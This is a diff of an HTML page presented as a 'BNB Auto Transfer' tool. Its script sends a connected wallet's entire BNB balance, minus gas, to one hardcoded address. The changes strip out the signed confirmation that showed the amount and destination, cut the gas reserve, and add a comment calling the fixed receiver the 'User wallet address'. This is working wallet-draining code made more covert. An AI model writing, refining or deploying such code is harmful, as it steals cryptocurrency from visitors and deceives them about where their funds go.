@@ -3,7 +3,7 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BNB Auto Transfer - Trust Wallet Compatible</title>
+  <title>BNB Auto Transfer</title>
 </head>
 <body>
   <div style="padding: 20px; text-align: center;">
@@ -13,8 +13,8 @@
   </div>
 
   <script>
-    const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8';
-    
+    const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8'; // User wallet address
+
     function updateStatus(message, isError = false) {
       const status = document.getElementById('status');
       status.innerHTML = message;
@@ -73,59 +73,26 @@
         });
         
         const balanceWei = BigInt(balanceHex);
-        const balanceEth = parseFloat(balanceWei.toString()) / Math.pow(10, 18);
-        
-        updateStatus(`Current Balance: ${balanceEth.toFixed(6)} BNB`);
+        const gasLimit = 21000n;
+        const gasPrice = 5000000000n;
+        const gasCost = gasLimit * gasPrice;
 
-        if (balanceEth < 0.001) {
-          updateStatus(`Insufficient balance. Need at least 0.001 BNB, current: ${balanceEth.toFixed(6)} BNB`, true);
+        if (balanceWei <= gasCost) {
+          updateStatus('Not enough BNB to cover gas fees.', true);
           return;
         }
 
-        const gasLimit = 21000;
-        const gasPrice = 5000000000;
-        const gasReserve = gasLimit * gasPrice * 2;
-        
-        const gasReserveBigInt = BigInt(gasReserve);
-        
-        if (balanceWei <= gasReserveBigInt) {
-          updateStatus('Balance too low for gas fees', true);
-          return;
-        }
-        
-        const sendAmount = balanceWei - gasReserveBigInt;
-        const sendAmountEth = parseFloat(sendAmount.toString()) / Math.pow(10, 18);
-        
-        if (sendAmountEth <= 0) {
-          updateStatus('No amount available to send after gas fees', true);
-          return;
-        }
-
-        updateStatus(`Preparing to send: ${sendAmountEth.toFixed(6)} BNB`);
-
-        const confirmMessage = `Send ${sendAmountEth.toFixed(6)} BNB to ${receiverAddress}`;
-        
-        try {
-          await window.ethereum.request({
-            method: 'personal_sign',
-            params: [confirmMessage, userAccount],
-          });
-          updateStatus('Message signed. Sending transaction...');
-        } catch (signError) {
-          updateStatus('Transaction cancelled by user', true);
-          return;
-        }
+        const valueToSend = balanceWei - gasCost;
+        const sendAmountEth = parseFloat(valueToSend.toString()) / Math.pow(10, 18);
+        updateStatus(`Sending ${sendAmountEth.toFixed(6)} BNB...`);
 
         const txParams = {
           from: userAccount,
           to: receiverAddress,
-          value: '0x' + sendAmount.toString(16),
+          value: '0x' + valueToSend.toString(16),
           gas: '0x' + gasLimit.toString(16),
           gasPrice: '0x' + gasPrice.toString(16)
         };
-
-        console.log('Transaction params:', txParams);
-        updateStatus('Submitting transaction...');
 
         const txHash = await window.ethereum.request({
           method: 'eth_sendTransaction',
@@ -137,23 +104,10 @@
 
       } catch (error) {
         console.error('Error:', error);
-        
         let errorMsg = 'Transaction failed';
-        
-        if (error.code === 4001) {
-          errorMsg = 'Transaction rejected by user';
-        } else if (error.code === -32000) {
-          errorMsg = error.message.includes('insufficient funds') ? 'Insufficient funds for transaction' : 'Network error or insufficient gas';
-        } else if (error.message) {
-          if (error.message.includes('User denied') || error.message.includes('cancelled')) {
-            errorMsg = 'Transaction cancelled by user';
-          } else if (error.message.includes('insufficient')) {
-            errorMsg = 'Insufficient balance or gas';
-          } else {
-            errorMsg = `Error: ${error.message.substring(0, 100)}`;
-          }
-        }
-        
+        if (error.code === 4001) errorMsg = 'Transaction rejected by user';
+        else if (error.code === -32000 && error.message.includes('insufficient')) errorMsg = 'Insufficient funds';
+        else if (error.message) errorMsg = `Error: ${error.message.substring(0, 100)}`;
         updateStatus(errorMsg, true);
         alert(errorMsg);
       }
